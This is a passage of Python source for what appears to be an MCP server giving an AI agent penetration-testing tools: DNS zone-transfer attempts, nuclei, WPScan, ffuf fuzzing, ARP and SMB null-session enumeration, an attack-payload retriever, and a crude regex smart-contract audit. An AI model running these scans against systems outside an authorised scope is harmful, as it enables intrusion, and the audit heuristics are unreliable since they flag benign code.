        rtype = rtype.strip().upper()
        cmd = ["dig", "+short", target, rtype]
        r = run_command_advanced(cmd, timeout=15, trace=trace)
        records = [l.strip() for l in r["stdout"].split("\n") if l.strip()]
        if records:
            dns_results[rtype] = records

    progress.update("Full dig output")
    full_dig = run_command_advanced(["dig", "+noall", "+answer", target, "ANY"], timeout=20, trace=trace)

    progress.update("Zone transfer attempt")
    zt_results = []
    if zone_transfer and "NS" in dns_results:
        for ns in dns_results["NS"]:
            ns = ns.rstrip(".")
            zt_cmd = ["dig", f"@{ns}", target, "AXFR", "+short"]
            zt_r = run_command_advanced(zt_cmd, timeout=20, trace=trace)
            if zt_r["stdout"].strip() and "Transfer failed" not in zt_r["stdout"]:
                zt_results.append({"nameserver": ns, "records": zt_r["stdout"][:3000],
                                   "vulnerable": True})
            else:
                zt_results.append({"nameserver": ns, "vulnerable": False})

    progress.update("WHOIS lookup")
    whois_result = run_command_advanced(["whois", target], timeout=30, trace=trace)
    whois_info = {}
    for line in whois_result["stdout"].split("\n"):
        for key in ["Registrar", "Creation Date", "Expiration Date", "Name Server", "DNSSEC", "Registrant"]:
            if key.lower() in line.lower() and ":" in line:
                whois_info[line.split(":")[0].strip()] = ":".join(line.split(":")[1:]).strip()

    progress.update("Reverse DNS")
    reverse_dns = {}
    if "A" in dns_results:
        for ip in dns_results["A"][:5]:
            rev_cmd = ["dig", "+short", "-x", ip]
            rev_r = run_command_advanced(rev_cmd, timeout=10, trace=trace)
            if rev_r["stdout"].strip():
                reverse_dns[ip] = rev_r["stdout"].strip()

    progress.update("Analysis")
    zone_transfer_vuln = any(z.get("vulnerable") for z in zt_results)
    output = {
        "status": "success", "target": target,
        "dns_records": dns_results,
        "full_dig_output": full_dig["stdout"][:2000],
        "zone_transfer": {"attempted": zone_transfer, "results": zt_results,
                         "vulnerable": zone_transfer_vuln},
        "whois": whois_info,
        "reverse_dns": reverse_dns,
        "severity": "HIGH" if zone_transfer_vuln else "info",
        "record_count": sum(len(v) for v in dns_results.values())
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("dns_recon", target, output)
    log_tool_execution("dns_recon", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# ADVANCED RECON TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def nuclei_scan(
    target: str,
    templates: str = "",
    severity: str = "critical,high,medium",
    rate_limit: int = 150,
    concurrency: int = 25,
    timeout: int = 300
) -> str:
    """
    Vulnerability scanning with Nuclei templates engine. Supports custom templates, severity filtering, and chain enrichment.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("nuclei_scan", target, 7)
    inputs = {"target": target, "templates": templates, "severity": severity}

    progress.update("Checking Nuclei availability")
    check = run_command_advanced(["which", "nuclei"], timeout=10, trace=trace)
    if check["return_code"] != 0:
        output = {"status": "error", "message": "nuclei not found. Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"}
        log_tool_execution("nuclei_scan", target, inputs, output, trace, progress)
        return json.dumps(output, indent=2)

    progress.update("Building scan command")
    url = target if target.startswith("http") else f"http://{target}"
    json_out = os.path.join(exec_dir, "nuclei_output.json")
    cmd = ["nuclei", "-u", url, "-severity", severity, "-rate-limit", str(rate_limit),
           "-concurrency", str(concurrency), "-json-export", json_out, "-silent"]
    if templates:
        cmd.extend(["-t", templates])

    progress.update("Running Nuclei scan")
    trace.command(f"nuclei -u {url} -severity {severity}")
    result = run_command_advanced(cmd, timeout=timeout, trace=trace)

    progress.update("Parsing results")
    findings = []
    if os.path.exists(json_out):
        with open(json_out) as f:
            for line in f:
                try:
                    findings.append(json.loads(line.strip()))
                except Exception:
                    pass

    for line in result["stdout"].split("\n"):
        if line.strip() and not line.startswith("["):
            try:
                findings.append(json.loads(line.strip()))
            except Exception:
                pass

    progress.update("Categorizing findings")
    categorized = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
    for f in findings:
        sev = f.get("info", {}).get("severity", "info").lower()
        entry = {
            "template_id": f.get("template-id", f.get("templateID", "")),
            "name": f.get("info", {}).get("name", ""),
            "severity": sev,
            "matched_at": f.get("matched-at", f.get("matched", "")),
            "description": f.get("info", {}).get("description", "")[:500],
            "reference": f.get("info", {}).get("reference", [])[:5],
            "tags": f.get("info", {}).get("tags", [])
        }
        categorized.get(sev, categorized["info"]).append(entry)

    progress.update("Analysis")
    output = {
        "status": "success", "target": url,
        "total_findings": len(findings),
        "severity_summary": {k: len(v) for k, v in categorized.items()},
        "findings": categorized,
        "severity": "CRITICAL" if categorized["critical"] else ("HIGH" if categorized["high"] else "info")
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("nuclei_scan", target, output)
    log_tool_execution("nuclei_scan", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def wpscan_audit(
    target: str,
    enumerate: str = "vp,vt,u,dbe",
    api_token: str = "",
    timeout: int = 180
) -> str:
    """
    WordPress security audit using WPScan. Enumerates vulnerable plugins, themes, users, and config issues.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("wpscan_audit", target, 7)
    url = target if target.startswith("http") else f"http://{target}"
    inputs = {"target": url, "enumerate": enumerate}

    progress.update("Building WPScan command")
    json_out = os.path.join(exec_dir, "wpscan_output.json")
    cmd = ["wpscan", "--url", url, "--enumerate", enumerate, "--format", "json",
           "--output", json_out, "--no-banner", "--random-user-agent"]
    if api_token:
        cmd.extend(["--api-token", api_token])

    progress.update("Running WPScan")
    trace.command(f"wpscan --url {url} --enumerate {enumerate}")
    result = run_command_advanced(cmd, timeout=timeout, trace=trace)

    progress.update("Parsing results")
    wp_data = {}
    if os.path.exists(json_out):
        try:
            with open(json_out) as f:
                wp_data = json.load(f)
        except Exception:
            pass

    progress.update("Extracting vulnerabilities")
    vulns = []
    for key in ["plugins", "themes", "main_theme"]:
        items = wp_data.get(key, {})
        if isinstance(items, dict):
            for name, data in items.items():
                for v in data.get("vulnerabilities", []):
                    vulns.append({
                        "component": f"{key}/{name}",
                        "title": v.get("title", ""),
                        "vuln_type": v.get("vuln_type", ""),
                        "fixed_in": v.get("fixed_in", ""),
                        "references": v.get("references", {}).get("url", [])[:5]
                    })

    wp_version = wp_data.get("version", {})
    users = [u.get("username", u) if isinstance(u, dict) else str(u) for u in wp_data.get("users", [])]

    progress.update("Checking interesting findings")
    interesting = wp_data.get("interesting_findings", [])
    findings_summary = []
    for finding in interesting:
        findings_summary.append({
            "url": finding.get("url", ""),
            "type": finding.get("type", ""),
            "interesting_entries": finding.get("interesting_entries", [])[:5]
        })

    progress.update("Analysis")
    output = {
        "status": "success", "target": url,
        "wordpress_version": wp_version.get("number", "unknown") if isinstance(wp_version, dict) else str(wp_version),
        "vulnerabilities_found": len(vulns), "vulnerabilities": vulns,
        "users_found": users[:20], "user_count": len(users),
        "interesting_findings": findings_summary[:20],
        "raw_output_preview": result["stdout"][:2000],
        "severity": "CRITICAL" if vulns else "info"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("wpscan_audit", target, output)
    log_tool_execution("wpscan_audit", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def ffuf_fuzz(
    target: str,
    wordlist: str = "",
    fuzz_mode: str = "dir",
    extensions: str = "",
    method: str = "GET",
    headers: str = "",
    data: str = "",
    filters: str = "",
    threads: int = 40,
    timeout: int = 180
) -> str:
    """
    Fast web fuzzer using ffuf. Modes: dir (directory), vhost (virtual host), param (parameter), custom (FUZZ keyword in URL).
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("ffuf_fuzz", target, 7)
    url = target if target.startswith("http") else f"http://{target}"
    inputs = {"target": url, "fuzz_mode": fuzz_mode, "method": method}

    progress.update("Preparing wordlist")
    if not wordlist or not os.path.exists(wordlist):
        default_lists = {
            "dir": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
            "vhost": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "param": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
        }
        wordlist = default_lists.get(fuzz_mode, default_lists["dir"])
        if not os.path.exists(wordlist):
            wordlist = "/usr/share/wordlists/dirb/common.txt"

    progress.update("Building ffuf command")
    json_out = os.path.join(exec_dir, "ffuf_output.json")
    if fuzz_mode == "dir":
        fuzz_url = url.rstrip("/") + "/FUZZ"
    elif fuzz_mode == "vhost":
        fuzz_url = url
    elif fuzz_mode == "param":
        sep = "&" if "?" in url else "?"
        fuzz_url = f"{url}{sep}FUZZ=test"
    else:
        fuzz_url = url if "FUZZ" in url else url.rstrip("/") + "/FUZZ"

    cmd = ["ffuf", "-u", fuzz_url, "-w", wordlist, "-t", str(threads),
           "-o", json_out, "-of", "json", "-mc", "all"]
    if fuzz_mode == "vhost":
        host = target.split("/")[0] if "/" in target else target
        cmd.extend(["-H", f"Host: FUZZ.{host}"])
    if extensions and fuzz_mode == "dir":
        cmd.extend(["-e", extensions])
    if method != "GET":
        cmd.extend(["-X", method])
    if headers:
        for h in headers.split(";"):
            if h.strip():
                cmd.extend(["-H", h.strip()])
    if data:
        cmd.extend(["-d", data])
    if filters:
        cmd.extend(["-fc", filters])
    else:
        cmd.extend(["-fc", "404"])

    progress.update("Running ffuf")
    trace.command(f"ffuf -u {fuzz_url}")
    result = run_command_advanced(cmd, timeout=timeout, trace=trace)

    progress.update("Parsing results")
    ffuf_data = {}
    if os.path.exists(json_out):
        try:
            with open(json_out) as f:
                ffuf_data = json.load(f)
        except Exception:
            pass

    ffuf_results = ffuf_data.get("results", [])
    categorized = {"2xx": [], "3xx": [], "4xx": [], "5xx": []}
    for r in ffuf_results:
        status = r.get("status", 0)
        entry = {
            "input": r.get("input", {}).get("FUZZ", ""),
            "url": r.get("url", ""),
            "status": status,
            "length": r.get("length", 0),
            "words": r.get("words", 0),
            "lines": r.get("lines", 0)
        }
        if 200 <= status < 300: categorized["2xx"].append(entry)
        elif 300 <= status < 400: categorized["3xx"].append(entry)
        elif 400 <= status < 500: categorized["4xx"].append(entry)
        else: categorized["5xx"].append(entry)

    progress.update("Analysis")
    high_interest = [r for r in categorized["2xx"] if r["length"] > 0]
    output = {
        "status": "success", "target": url, "fuzz_mode": fuzz_mode,
        "total_results": len(ffuf_results),
        "status_summary": {k: len(v) for k, v in categorized.items()},
        "high_interest_results": high_interest[:50],
        "all_results": {k: v[:30] for k, v in categorized.items()},
        "wordlist": wordlist
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("ffuf_fuzz", target, output)
    log_tool_execution("ffuf_fuzz", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# NETWORK TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def arp_scan(
    network: str = "192.168.1.0/24",
    interface: str = "",
    timeout: int = 60
) -> str:
    """
    Network host discovery using ARP scanning. Discovers live hosts, MAC addresses, and vendor identification.
    """
    target = network
    trace, progress, exec_dir = _init_tool_context("arp_scan", target, 5)
    inputs = {"network": network, "interface": interface}

    progress.update("Running ARP scan")
    cmd = ["arp-scan"]
    if interface:
        cmd.extend(["-I", interface])
    cmd.append(network)
    trace.command(f"arp-scan {network}")
    result = run_command_advanced(cmd, timeout=timeout, trace=trace)

    progress.update("Parsing hosts")
    hosts = []
    for line in result["stdout"].split("\n"):
        parts = line.split("\t")
        if len(parts) >= 2 and re.match(r'\d+\.\d+\.\d+\.\d+', parts[0].strip()):
            host = {"ip": parts[0].strip(), "mac": parts[1].strip() if len(parts) > 1 else ""}
            if len(parts) > 2:
                host["vendor"] = parts[2].strip()
            hosts.append(host)

    progress.update("Nmap fallback ping sweep")
    if not hosts:
        nmap_cmd = ["nmap", "-sn", "-T4", network]
        nmap_result = run_command_advanced(nmap_cmd, timeout=60, trace=trace)
        for line in nmap_result["stdout"].split("\n"):
            m = re.search(r'Nmap scan report for (\S+)', line)
            if m:
                hosts.append({"ip": m.group(1), "mac": "", "vendor": "nmap-discovered"})

    progress.update("Analysis")
    output = {
        "status": "success", "network": network,
        "hosts_found": len(hosts), "hosts": hosts,
        "unique_vendors": list(set(h.get("vendor", "") for h in hosts if h.get("vendor"))),
        "raw_output_preview": result["stdout"][:2000]
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("arp_scan", target, output)
    log_tool_execution("arp_scan", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def enum4linux_scan(
    target: str,
    aggressive: bool = False,
    timeout: int = 120
) -> str:
    """
    Windows/Samba enumeration using enum4linux. Discovers shares, users, groups, OS info, password policies.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("enum4linux_scan", target, 6)
    inputs = {"target": target, "aggressive": aggressive}

    progress.update("Running enum4linux")
    cmd = ["enum4linux"]
    if aggressive:
        cmd.append("-a")
    else:
        cmd.append("-a")
    cmd.append(target)
    trace.command(f"enum4linux -a {target}")
    result = run_command_advanced(cmd, timeout=timeout, trace=trace)

    progress.update("Parsing shares")
    shares = []
    users = []
    groups = []
    os_info = ""
    password_policy = {}

    output_lines = result["stdout"].split("\n")
    current_section = ""
    for line in output_lines:
        if "Sharename" in line:
            current_section = "shares"
        elif "user:" in line.lower() or "username" in line.lower():
            m = re.search(r'user:\[(\S+)\]', line)
            if m:
                users.append(m.group(1))
        elif "group:" in line.lower():
            m = re.search(r'group:\[(.+?)\]', line)
            if m:
                groups.append(m.group(1))
        elif "OS=" in line or "OS:" in line:
            os_info = line.strip()
        elif current_section == "shares" and line.strip() and not line.startswith("---"):
            parts = line.split()
            if parts and not parts[0].startswith("="):
                shares.append({"name": parts[0], "type": parts[1] if len(parts) > 1 else "",
                              "comment": " ".join(parts[2:]) if len(parts) > 2 else ""})
        elif "password" in line.lower() and ":" in line:
            k, _, v = line.partition(":")
            password_policy[k.strip()] = v.strip()

    progress.update("SMB client check")
    smb_cmd = ["smbclient", "-L", f"//{target}", "-N"]
    smb_result = run_command_advanced(smb_cmd, timeout=30, trace=trace)

    progress.update("Null session check")
    rpcclient_cmd = ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"]
    rpc_result = run_command_advanced(rpcclient_cmd, timeout=30, trace=trace)
    null_session = rpc_result["return_code"] == 0 and "user:" in rpc_result["stdout"].lower()

    progress.update("Analysis")
    output = {
        "status": "success", "target": target,
        "os_info": os_info, "shares": shares, "users": users[:50], "groups": groups[:50],
        "password_policy": password_policy, "null_session_possible": null_session,
        "smb_output_preview": smb_result["stdout"][:1500],
        "raw_output_preview": result["stdout"][:3000],
        "severity": "HIGH" if null_session or shares else "info"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("enum4linux_scan", target, output)
    log_tool_execution("enum4linux_scan", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# UTILITY TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def get_payloads(
    category: str = "all",
    search: str = ""
) -> str:
    """
    Retrieve penetration testing payloads. Categories: xss, sqli, lfi, rce, ssti, xxe, ssrf, auth_bypass, headers, all.
    """
    target = f"payloads_{category}"
    trace, progress, exec_dir = _init_tool_context("get_payloads", target, 3)
    inputs = {"category": category, "search": search}

    progress.update("Loading payloads")
    payloads = PayloadGenerator.get_payloads(category)

    progress.update("Filtering")
    if search:
        search_lower = search.lower()
        payloads = {k: [p for p in v if search_lower in p.lower()] for k, v in payloads.items()}
        payloads = {k: v for k, v in payloads.items() if v}

    total = sum(len(v) for v in payloads.values())
    output = {
        "status": "success", "category": category, "search_filter": search,
        "total_payloads": total,
        "payloads": {k: v[:50] for k, v in payloads.items()},
        "categories_available": ["xss", "sqli", "lfi", "rce", "ssti", "xxe", "ssrf", "auth_bypass", "headers"]
    }

    progress.update("Complete")
    log_tool_execution("get_payloads", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def web_tech_detect(
    target: str,
    timeout: int = 60
) -> str:
    """
    Detect web technologies, frameworks, CMS, servers, and libraries using multiple methods (headers, whatweb, wappalyzer patterns).
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("web_tech_detect", target, 6)
    url = target if target.startswith("http") else f"http://{target}"
    inputs = {"target": url}

    progress.update("HTTP header analysis")
    curl_cmd = ["curl", "-sI", "-k", "--max-time", "15", "-L", url]
    curl_result = run_command_advanced(curl_cmd, timeout=20, trace=trace)
    headers_info = {}
    for line in curl_result["stdout"].split("\n"):
        if ":" in line:
            k, _, v = line.partition(":")
            headers_info[k.strip().lower()] = v.strip()

    detected_tech = []
    server = headers_info.get("server", "")
    if server:
        detected_tech.append({"name": "Server", "value": server, "source": "headers"})
    powered = headers_info.get("x-powered-by", "")
    if powered:
        detected_tech.append({"name": "X-Powered-By", "value": powered, "source": "headers"})

    progress.update("WhatWeb scan")
    whatweb_cmd = ["whatweb", "--color=never", "-v", url]
    whatweb_result = run_command_advanced(whatweb_cmd, timeout=30, trace=trace)
    whatweb_entries = []
    for line in whatweb_result["stdout"].split("\n"):
        if line.strip() and not line.startswith("http"):
            whatweb_entries.append(line.strip())

    progress.update("Body content analysis")
    body_cmd = ["curl", "-sk", "--max-time", "15", "-L", url]
    body_result = run_command_advanced(body_cmd, timeout=20, trace=trace)
    body_lower = body_result["stdout"].lower()

    tech_signatures = {
        "WordPress": ["wp-content", "wp-includes", "wordpress"],
        "Joomla": ["joomla", "/media/system/js/", "com_content"],
        "Drupal": ["drupal", "sites/default/files", "misc/drupal.js"],
        "React": ["react", "_react", "react-dom", "__NEXT_DATA__"],
        "Angular": ["ng-version", "angular", "ng-app"],
        "Vue.js": ["vue.js", "vue.min.js", "__vue__", "vue-router"],
        "jQuery": ["jquery", "jquery.min.js"],
        "Bootstrap": ["bootstrap", "bootstrap.min.css"],
        "Laravel": ["laravel", "csrf-token"],
        "Django": ["csrfmiddlewaretoken", "django"],
        "Express": ["express", "x-powered-by: express"],
        "Nginx": ["nginx"],
        "Apache": ["apache"],
        "PHP": [".php", "phpsessid"],
        "ASP.NET": ["asp.net", "__viewstate", ".aspx"],
        "Ruby on Rails": ["rails", "ruby on rails"],
        "Next.js": ["_next/", "__next"],
        "Nuxt.js": ["__nuxt", "_nuxt/"],
        "Cloudflare": ["cloudflare", "cf-ray"],
        "AWS": ["amazonaws", "x-amz"],
        "Shopify": ["shopify", "cdn.shopify.com"],
        "Magento": ["magento", "mage/"],
        "Wix": ["wix.com", "wixstatic"]
    }
    for tech, sigs in tech_signatures.items():
        for sig in sigs:
            if sig in body_lower:
                detected_tech.append({"name": tech, "confidence": "medium", "source": "body_analysis"})
                break

    progress.update("Cookie analysis")
    cookies = headers_info.get("set-cookie", "")
    cookie_tech = []
    cookie_map = {"phpsessid": "PHP", "jsessionid": "Java", "asp.net_sessionid": "ASP.NET",
                  "laravel_session": "Laravel", "_csrf": "Node.js/Express", "connect.sid": "Express",
                  "django": "Django", "rack.session": "Ruby/Rack"}
    for sig, tech in cookie_map.items():
        if sig in cookies.lower():
            cookie_tech.append(tech)
            detected_tech.append({"name": tech, "confidence": "high", "source": "cookies"})

    progress.update("Analysis")
    unique_tech = {}
    for t in detected_tech:
        name = t["name"]
        if name not in unique_tech or t.get("confidence", "low") == "high":
            unique_tech[name] = t
    detected_tech = list(unique_tech.values())

    output = {
        "status": "success", "target": url,
        "technologies_detected": len(detected_tech),
        "technologies": detected_tech,
        "headers": headers_info,
        "whatweb_output": whatweb_entries[:30],
        "cookies_analysis": cookie_tech,
        "security_headers": {
            "x_frame_options": headers_info.get("x-frame-options", "MISSING"),
            "content_security_policy": headers_info.get("content-security-policy", "MISSING"),
            "strict_transport_security": headers_info.get("strict-transport-security", "MISSING"),
            "x_content_type_options": headers_info.get("x-content-type-options", "MISSING"),
            "x_xss_protection": headers_info.get("x-xss-protection", "MISSING")
        }
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("web_tech_detect", target, output)
    log_tool_execution("web_tech_detect", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# BUG BOUNTY TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def scope_check(
    target: str,
    program_url: str = "",
    platform: str = "hackerone",
    in_scope_domains: str = "",
    out_of_scope_patterns: str = ""
) -> str:
    """
    Bug bounty scope verification. Checks if target is within program scope.
    Platforms: hackerone, bugcrowd, intigriti, immunefi.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("scope_check", target, 5)
    inputs = {"target": target, "platform": platform, "program_url": program_url}

    progress.update("Parsing scope rules")
    in_scope = [d.strip() for d in in_scope_domains.split(",") if d.strip()] if in_scope_domains else []
    out_scope = [p.strip() for p in out_of_scope_patterns.split(",") if p.strip()] if out_of_scope_patterns else []

    progress.update("Checking scope")
    is_in_scope = False
    scope_reason = ""
    target_domain = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]

    if in_scope:
        for domain in in_scope:
            if target_domain == domain or target_domain.endswith("." + domain):
                is_in_scope = True
                scope_reason = f"Matches in-scope domain: {domain}"
                break
        if not is_in_scope:
            scope_reason = "Target not in provided scope domains"
    else:
        is_in_scope = True
        scope_reason = "No scope domains specified - manual verification required"

    for pattern in out_scope:
        if pattern in target_domain:
            is_in_scope = False
            scope_reason = f"Matches out-of-scope pattern: {pattern}"
            break

    progress.update("Resolving target info")
    try:
        ip = socket.gethostbyname(target_domain)
    except Exception:
        ip = "unresolved"

    progress.update("Platform info")
    platform_info = {
        "hackerone": {"report_url": "https://hackerone.com/reports/new", "format": "Markdown",
                     "severity_rating": "CVSS 3.0", "min_bounty_typical": "$100"},
        "bugcrowd": {"report_url": "https://bugcrowd.com/", "format": "Markdown",
                    "severity_rating": "P1-P5", "min_bounty_typical": "$150"},
        "intigriti": {"report_url": "https://app.intigriti.com/", "format": "Rich Text",
                     "severity_rating": "CVSS 3.1", "min_bounty_typical": "€100"},
        "immunefi": {"report_url": "https://immunefi.com/", "format": "Markdown",
                    "severity_rating": "Impact-based", "min_bounty_typical": "$1000",
                    "focus": "Smart Contracts / DeFi / Blockchain"}
    }

    output = {
        "status": "success", "target": target, "target_domain": target_domain, "ip": ip,
        "in_scope": is_in_scope, "scope_reason": scope_reason,
        "platform": platform,
        "platform_info": platform_info.get(platform, {}),
        "in_scope_domains": in_scope, "out_of_scope_patterns": out_scope,
        "recommendation": "PROCEED with testing" if is_in_scope else "DO NOT TEST - out of scope"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("scope_check", target, output)
    log_tool_execution("scope_check", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def generate_report(
    target: str,
    title: str = "Security Assessment Report",
    report_format: str = "markdown",
    include_chain_data: bool = True,
    severity_filter: str = ""
) -> str:
    """
    Generate comprehensive penetration testing report from chain data.
    Aggregates all tool results for a target into a structured report.
    Formats: markdown, json, html.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("generate_report", target, 6)
    inputs = {"target": target, "title": title, "format": report_format}

    progress.update("Gathering chain data")
    chain_data = chain_engine.get_related_results(target)
    chain_summary = chain_engine.get_chain_summary(target)

    progress.update("Categorizing findings")
    findings = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
    for tool_name, results in chain_data.items():
        for result in (results if isinstance(results, list) else [results]):
            if not isinstance(result, dict):
                continue
            sev = result.get("severity", "info").lower()
            if sev in ["critical", "high", "medium", "low", "info"]:
                findings[sev].append({"tool": tool_name, "data": _truncate_dict(result, 500)})

    if severity_filter:
        allowed = [s.strip().lower() for s in severity_filter.split(",")]
        findings = {k: v for k, v in findings.items() if k in allowed}

    progress.update("Building executive summary")
    total_findings = sum(len(v) for v in findings.values())
    exec_summary = {
        "target": target,
        "assessment_date": generate_timestamp(),
        "tools_used": list(chain_data.keys()),
        "total_findings": total_findings,
        "severity_breakdown": {k: len(v) for k, v in findings.items()},
        "overall_risk": "CRITICAL" if findings.get("critical") else
                       ("HIGH" if findings.get("high") else
                        ("MEDIUM" if findings.get("medium") else "LOW"))
    }

    progress.update("Generating report body")
    if report_format == "markdown":
        md_lines = [f"# {title}", f"\n**Target:** {target}",
                   f"**Date:** {exec_summary['assessment_date']}",
                   f"**Overall Risk:** {exec_summary['overall_risk']}", "",
                   "## Executive Summary", f"- Tools used: {len(exec_summary['tools_used'])}",
                   f"- Total findings: {total_findings}"]
        for sev in ["critical", "high", "medium", "low", "info"]:
            md_lines.append(f"- {sev.upper()}: {len(findings.get(sev, []))}")
        md_lines.append("\n## Detailed Findings")
        for sev in ["critical", "high", "medium", "low"]:
            for f in findings.get(sev, []):
                md_lines.append(f"\n### [{sev.upper()}] {f['tool']}")
                md_lines.append(f"```json\n{json.dumps(f['data'], indent=2)[:1000]}\n```")
        md_lines.append("\n## Recommendations")
        if findings.get("critical"):
            md_lines.append("1. **IMMEDIATE ACTION REQUIRED** - Address critical findings before production deployment")
        if findings.get("high"):
            md_lines.append("2. **HIGH PRIORITY** - Remediate high severity issues within 7 days")
        report_body = "\n".join(md_lines)

        report_file = os.path.join(exec_dir, "report.md")
        with open(report_file, "w") as f:
            f.write(report_body)
    else:
        report_body = None
        report_file = os.path.join(exec_dir, "report.json")

    progress.update("Analysis")
    output = {
        "status": "success", "target": target, "title": title, "format": report_format,
        "executive_summary": exec_summary,
        "findings": {k: v[:10] for k, v in findings.items()},
        "chain_summary": chain_summary,
        "report_file": report_file,
        "report_preview": report_body[:3000] if report_body else json.dumps(findings, indent=2)[:3000]
    }

    progress.update("Complete")
    log_tool_execution("generate_report", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# CRYPTO / DEFI / BLOCKCHAIN TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def smart_contract_audit(
    contract_address: str = "",
    source_code: str = "",
    chain: str = "ethereum",
    timeout: int = 120
) -> str:
    """
    Smart contract security audit. Detects reentrancy, integer overflow, access control, and common Solidity vulnerabilities.
    """
    target = contract_address or "source_audit"
    trace, progress, exec_dir = _init_tool_context("smart_contract_audit", target, 6)
    inputs = {"contract_address": contract_address, "chain": chain, "has_source": bool(source_code)}

    progress.update("Preparing analysis")
    vulnerabilities = []

    if source_code:
        progress.update("Static analysis of source code")
        vuln_patterns = {
            "reentrancy": [r'\.call\{value:', r'\.call\.value\(', r'\.send\(', r'\.transfer\('],
            "integer_overflow": [r'SafeMath', r'\+\+', r'\-\-', r'\*\s*\d+'],
            "unchecked_return": [r'\.call\(', r'\.send\(', r'\.delegatecall\('],
            "tx_origin": [r'tx\.origin'],
            "selfdestruct": [r'selfdestruct\(', r'suicide\('],
            "delegatecall": [r'\.delegatecall\('],
            "timestamp_dependence": [r'block\.timestamp', r'now\b'],
            "access_control": [r'onlyOwner', r'require\(msg\.sender'],
            "front_running": [r'block\.number', r'blockhash'],
            "dos_gas_limit": [r'for\s*\(', r'while\s*\(']
        }
        for vuln_type, patterns in vuln_patterns.items():
            for pattern in patterns:
                matches = re.findall(pattern, source_code)
                if matches:
                    vulnerabilities.append({
                        "type": vuln_type, "severity": "HIGH" if vuln_type in ["reentrancy", "selfdestruct", "delegatecall"] else "MEDIUM",
                        "matches": len(matches), "pattern": pattern,
                        "description": f"Potential {vuln_type.replace('_', ' ')} vulnerability detected"
                    })

        slither_check = run_command_advanced(["which", "slither"], timeout=10, trace=trace)
        if slither_check["return_code"] == 0:
            sol_file = os.path.join(exec_dir, "contract.sol")
            with open(sol_file, "w") as f:
                f.write(source_code)
            progress.update("Running Slither")
            slither_cmd = ["slither", sol_file, "--json", os.path.join(exec_dir, "slither.json")]
            run_command_advanced(slither_cmd, timeout=timeout, trace=trace)

    if contract_address:
        progress.update("Fetching on-chain data")
        chain_apis = {
            "ethereum": f"https://api.etherscan.io/api?module=contract&action=getsourcecode&address={contract_address}",
            "bsc": f"https://api.bscscan.com/api?module=contract&action=getsourcecode&address={contract_address}",
            "polygon": f"https://api.polygonscan.com/api?module=contract&action=getsourcecode&address={contract_address}"
        }
        api_url = chain_apis.get(chain, chain_apis["ethereum"])
        api_cmd = ["curl", "-s", "--max-time", "15", api_url]
        api_result = run_command_advanced(api_cmd, timeout=20, trace=trace)
        try:
            api_data = json.loads(api_result["stdout"])
            if api_data.get("result") and isinstance(api_data["result"], list):
                contract_info = api_data["result"][0]
                if contract_info.get("SourceCode"):
                    progress.update("Analyzing on-chain source")
        except Exception:
            pass

    progress.update("Analysis")
    critical_vulns = [v for v in vulnerabilities if v.get("severity") == "HIGH"]
    output = {
        "status": "success", "target": target, "chain": chain,
        "vulnerabilities_found": len(vulnerabilities),
        "critical_count": len(critical_vulns),
        "vulnerabilities": vulnerabilities,
        "risk_score": min(10, len(critical_vulns) * 3 + (len(vulnerabilities) - len(critical_vulns))),
        "recommendations": [
            "Use OpenZeppelin SafeMath or Solidity 0.8+ for arithmetic",
            "Implement checks-effects-interactions pattern for reentrancy",
            "Use access control modifiers consistently",
            "Avoid tx.origin for authorization",
            "Add emergency pause functionality"
        ] if vulnerabilities else ["No critical issues detected in static analysis"],
        "severity": "CRITICAL" if len(critical_vulns) > 2 else ("HIGH" if critical_vulns else "info")
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("smart_contract_audit", target, output)
    log_tool_execution("smart_contract_audit", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def defi_protocol_scan(
    protocol_url: str = "",
    contract_address: str = "",
    chain: str = "ethereum",
    timeout: int = 120
) -> str:
    """
    DeFi protocol security scan. Checks for flash loan vulnerabilities, oracle manipulation, governance attacks, and rug pull indicators.
    """
    target = protocol_url or contract_address or "unknown"
